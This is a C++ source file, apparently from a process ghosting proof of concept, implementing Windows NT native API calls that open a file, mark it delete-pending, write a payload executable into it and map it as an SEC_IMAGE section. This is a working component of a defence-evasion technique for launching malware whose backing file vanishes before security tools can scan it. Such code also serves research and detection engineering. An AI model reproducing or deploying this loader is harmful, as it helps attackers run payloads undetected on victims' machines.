#include "delete_pending_file.h"

#include <iostream>
#include <stdio.h>

#include "ntddk.h"
#include "util.h"

#include "pe_hdrs_helper.h"
#pragma comment(lib, "Ntdll.lib")

HANDLE open_file(wchar_t* filePath)
{
    // convert to NT path
    std::wstring nt_path = L"\\??\\" + std::wstring(filePath);

    UNICODE_STRING file_name = { 0 };
    RtlInitUnicodeString(&file_name, nt_path.c_str());

    OBJECT_ATTRIBUTES attr = { 0 };
    InitializeObjectAttributes(&attr, &file_name, OBJ_CASE_INSENSITIVE, NULL, NULL);

    IO_STATUS_BLOCK status_block = { 0 };
    HANDLE file = INVALID_HANDLE_VALUE;
    NTSTATUS stat = NtOpenFile(&file,
        DELETE | SYNCHRONIZE | GENERIC_READ | GENERIC_WRITE,
        &attr,
        &status_block,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        FILE_SUPERSEDE | FILE_SYNCHRONOUS_IO_NONALERT
    );
    if (!NT_SUCCESS(stat)) {
        std::cout << "Failed to open, status: " << std::hex << stat << std::endl;
        return INVALID_HANDLE_VALUE;
    }
    std::wcout << "[+] Created temp file: " << filePath << "\n";
    return file;
}

HANDLE make_section_from_delete_pending_file(wchar_t* filePath, BYTE* payladBuf, DWORD payloadSize)
{
    HANDLE hDelFile = open_file(filePath);
    if (!hDelFile || hDelFile == INVALID_HANDLE_VALUE) {
        std::cerr << "Failed to create file" << std::dec << GetLastError() << std::endl;
        return INVALID_HANDLE_VALUE;
    }
    NTSTATUS status = 0;
    IO_STATUS_BLOCK status_block = { 0 };

    /* Set disposition flag */
    FILE_DISPOSITION_INFORMATION info = { 0 };
    info.DeleteFile = TRUE;

    status = NtSetInformationFile(hDelFile, &status_block, &info, sizeof(info), FileDispositionInformation);
    if (!NT_SUCCESS(status)) {
        std::cout << "Setting information failed: " << std::hex << status << "\n";
        return INVALID_HANDLE_VALUE;
    }
    std::cout << "[+] Information set\n";

    LARGE_INTEGER ByteOffset = { 0 };

    status = NtWriteFile(
        hDelFile,
        NULL,
        NULL,
        NULL,
        &status_block,
        payladBuf,
        payloadSize,
        &ByteOffset,
        NULL
    );
    if (!NT_SUCCESS(status)) {
        DWORD err = GetLastError();
        std::cerr << "Failed writing payload! Error: " << std::hex << err << std::endl;
        return INVALID_HANDLE_VALUE;
    }
    std::cout << "[+] Written!\n";

    HANDLE hSection = nullptr;
    status = NtCreateSection(&hSection,
        SECTION_ALL_ACCESS,
        NULL,
        0,
        PAGE_READONLY,
        SEC_IMAGE,
        hDelFile
    );
    if (status != STATUS_SUCCESS) {
        std::cerr << "NtCreateSection failed: " << std::hex << status << std::endl;
        return INVALID_HANDLE_VALUE;
    }
    NtClose(hDelFile);
    hDelFile = nullptr;

    return hSection;
}
